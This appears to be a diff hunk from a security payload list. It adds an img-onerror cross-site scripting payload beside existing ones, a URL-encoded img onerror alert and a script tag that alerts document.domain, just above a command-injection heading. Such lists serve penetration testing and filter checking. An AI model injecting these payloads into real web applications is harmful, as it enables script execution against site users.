@@ -8,6 +8,8 @@
 =<img%20src=x%20onerror=alert('Welcome,%20v \
 
 q=<g><script>alert%28document.domain%29<%2Fscript>
+  
+<img src=x onerror=console.log("XSS")>
 
 
 #Command Injection
